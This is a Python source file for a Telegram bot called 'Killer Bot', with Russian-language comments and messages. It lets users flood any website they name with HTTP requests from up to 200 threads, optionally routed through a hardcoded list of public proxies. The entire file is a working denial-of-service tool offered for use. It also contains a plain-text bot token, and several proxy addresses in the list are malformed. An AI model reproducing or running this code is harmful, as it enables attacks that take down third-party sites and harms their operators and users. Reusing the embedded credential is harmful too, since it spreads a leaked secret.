import time
import random
import requests
import threading
import telebot
from telebot import types

TOKEN = "9113463934:AAE8flC-GpI1lMQjXfms3zCnRjp92oGfvbo"
bot = telebot.TeleBot(TOKEN)

PROXIES_LIST = [
    "167.102.133.106:801", "2.186.205.122:801", "2.186.205.120:801",
    "67.102.133.111:801", "98.49.68.80:801", "77.221.44.113:49999",
    "38.54.71.67:8020", "0.174.198.86:8888", "183.100.14.134:8000",
    "172.245.10.130:34567", "47.90.205.231:33333", "189.240.60.164:9090",
    "207.148.71.74:8020", "2.55.67.194:80", "51.89.73.162:8010",
    "3.70.204.209:5931", "1216.173.80.232:6489", "186.97.198.18:5678",
    "50.171.122.30:80", "103.164.223.35:5678", "167.172.109.12:39452",
    "72.10.164.178:5737", "103.124.139.178:4145", "1.179.217.11:8080",
    "122.129.84.12:8080", "194.150.69.56:8888", "178.220.148.82:1080",
    "1202.91.41.170:8888", "157.100.6.202:999", "200.24.131.126:999",
    "117.250.3.58:8080", "170.80.91.1:4145", "199.188.89.246:8000",
    "185.212.115.98:8085", "103.47.93.232:1080", "45.7.176.78:5224",
    "6203.30.189.103:80", "65.21.141.136:1506", "3192.111.139.163:19404",
    "203.150.172.151:8080", "52.196.1.182:80", "178.20.31.231:8085",
    "58.246.58.150:9002", "154.16.146.41:80", "45.128.133.193:1080",
    "66.29.128.242:34179", "45.162.132.1:9999", "3.91.112.247:41258",
    "170.238.125.14:4153", "52.41.249.10:8018", "6.251.248.15:31337",
    "47.94.222.78:80", "74.208.222.134:46191", "109.194.22.61:8080",
    "72.10.160.90:27933", "111.89.130.105:3128", "207.244.217.99:6646",
    "112.78.47.188:8080", "45.87.154.214:8118", "77.243.90.107:8085",
    "164.90.252.243:8080", "36.67.249.249:5678", "103.118.28.41:1004",
    "103.102.141.39:4145", "93.103.8.183:4153", "118.99.108.4:8080",
    "85.214.56.170:12819", "46.105.124.74:7497", "193.151.189.201:8085",
    "154.236.177.10:19774", "3.133.206.244:3128", "45.238.12.4:3128",
    "67.43.236.18:1526", "7104.239.33.88:6443", "117.54.201.90:5678",
    "46.173.35.229:3629", "129.226.90.169:443", "103.133.37.77:4153",
    "46.107.230.122:1080", "104.128.103.32:64312", "217.145.226.238:8085",
    "72.10.164.178:8925", "37.252.66.125:46324", "3.123.150.192:3128",
    "151.236.14.178:14673", "207.180.252.117:2222", "129.213.160.66:3128",
    "50.172.75.124:80", "72.10.164.178:2923", "103.147.247.212:1234",
    "72.10.160.90:7297", "188.244.38.227:7999", "82.129.233.3:1976",
    "181.66.37.134:4153", "173.213.71.6:808", "8.218.47.103:8085",
    "36.229.100.73:80", "3.127.121.101:80", "45.63.91.126:9049",
    "190.111.238.127:49017", "138.36.196.11:4153", "89.145.162.81:3128",
    "173.21.8.226:3128", "196.1.95.124:80", "72.10.160.92:27103",
    "220.248.70.237:9002", "188.255.244.53:1080", "193.239.86.247:3128",
    "52.24.80.166:80", "103.120.6.46:80", "46.209.207.154:8080",
    "162.241.45.22:46889", "103.37.111.253:18081", "149.202.27.17:16379",
    "81.56.78.85:80", "65.109.189.49:80", "154.79.254.236:32650",
    "65.21.141.136:1525", "35.160.89.62:8080", "197.254.84.86:32650",
    "218.253.141.48:8080", "13.40.239.130:3128", "1.0.0.187:80",
    "103.87.169.189:32650", "185.118.153.110:8080", "46.21.153.16:3128",
    "177.93.60.70:999", "47.180.63.37:54321", "178.212.53.26:41258",
    "61.19.145.66:8080", "190.202.111.202:8080", "185.68.155.75:8085",
    "23.137.248.197:8888", "203.113.114.94:60606", "20.205.61.143:8123",
    "212.174.242.114:8080", "195.178.56.37:8080", "82.103.116.126:4153",
    "176.117.237.132:1080", "198.37.109.209:6316", "103.112.234.65:5678",
    "87.106.254.50:42266", "188.166.230.38:61190", "45.56.175.196:58709",
    "90.154.124.211:8080", "185.105.91.53:44444", "5.133.39.1:1080",
    "103.114.53.2:8080", "193.56.255.181:3128", "45.112.125.61:4145",
    "176.126.104.240:8085", "50.116.29.136:32728", "186.251.255.41:31337",
    "203.28.9.107:80", "178.212.65.61:3629", "212.231.230.141:18500",
    "200.216.55.162:8080", "49.156.42.186:5678", "103.165.234.46:8080",
    "202.69.38.42:5678", "194.87.140.161:1080", "192.111.138.29:4145",
    "104.200.152.30:4145", "68.71.247.130:4145", "142.54.235.9:4145",
    "98.170.57.249:4145", "72.210.221.197:4145", "24.249.199.12:4145",
    "184.181.217.194:4145",
]

active_attacks = {}
# user_id -> флаг остановки
stop_flags = {}

# --- Вспомогательные функции ---

def make_proxy():
    """Собирает словарь прокси из случайного элемента списка"""
    raw = random.choice(PROXIES_LIST)
    return {"http": f"http://{raw}", "https": f"http://{raw}"}

def noproxy_worker(site, user_id):
    """Атака без прокси"""
    while not stop_flags.get(user_id, False):
        try:
            requests.get(site, timeout=5)
        except Exception:
            pass
        time.sleep(0.01)

def tproxy_worker(site, user_id):
    """Атака с прокси"""
    while not stop_flags.get(user_id, False):
        try:
            requests.get(site, proxies=make_proxy(), timeout=5)
        except Exception:
            pass
        time.sleep(0.01)

def stop_user_attack(user_id):
    """Останавливает все потоки пользователя"""
    stop_flags[user_id] = True
    threads = active_attacks.get(user_id, [])
    for t in threads:
        t.join(timeout=1)
    active_attacks[user_id] = []
    stop_flags[user_id] = False

# --- Хэндлеры бота ---

@bot.message_handler(commands=['start'])
def cmd_start(message):
    markup = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("Без прокси", callback_data="mode_noproxy")
    btn2 = types.InlineKeyboardButton("С прокси", callback_data="mode_proxy")
    btn3 = types.InlineKeyboardButton("Остановить", callback_data="stop")
    markup.add(btn1, btn2)
    markup.add(btn3)
    bot.send_message(
        message.chat.id,
        "💀 *Killer Bot*\n\nВыбери режим атаки:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id

    if call.data == "stop":
        stop_user_attack(user_id)
        bot.answer_callback_query(call.id, "Атака остановлена")
        bot.send_message(chat_id, "🛑 Все потоки остановлены.")
        return

    if call.data == "mode_noproxy":
        mode = "noproxy"
        title = "Без прокси"
    elif call.data == "mode_proxy":
        mode = "proxy"
        title = "С прокси"
    else:
        return

    bot.answer_callback_query(call.id)
    msg = bot.send_message(
        chat_id,
        f"Режим: *{title}*\n\nОтправь ссылку на сайт:",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(msg, ask_threads, mode=mode)

def ask_threads(message, mode):
    site = message.text.strip()
    msg = bot.send_message(message.chat.id, "Сколько потоков? (1–200):")
    bot.register_next_step_handler(msg, start_attack, site=site, mode=mode)

def start_attack(message, site, mode):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        threads_count = int(message.text.strip())
        if threads_count < 1 or threads_count > 200:
            raise ValueError
    except ValueError:
        bot.send_message(chat_id, "❌ Введи число от 1 до 200.")
        return

    if not site.startswith(("http://", "https://")):
        site = "http://" + site

    # Если уже идёт атака — сначала остановим
    stop_user_attack(user_id)

    stop_flags[user_id] = False
    threads = []
    worker = noproxy_worker if mode == "noproxy" else tproxy_worker

    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(site, user_id), daemon=True)
        t.start()
        threads.append(t)

    active_attacks[user_id] = threads

    bot.send_message(
        chat_id,
        f"🚀 Атака запущена\n"
        f"Сайт: `{site}`\n"
        f"Режим: *{ 'без прокси' if mode == 'noproxy' else 'с прокси' }*\n"
        f"Потоков: *{threads_count}*\n\n"
        f"Чтобы остановить — /stop",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    stop_user_attack(message.from_user.id)
    bot.send_message(message.chat.id, "🛑 Атака остановлена.")

@bot.message_handler(commands=['help'])
def cmd_help(message):
    bot.send_message(
        message.chat.id,
        "Команды:\n"
        "/start — меню\n"
        "/stop — остановить атаку\n"
        "/help — помощь"
    )

if __name__ == "__main__":
    print("Bot started...")
    bot.infinity_polling()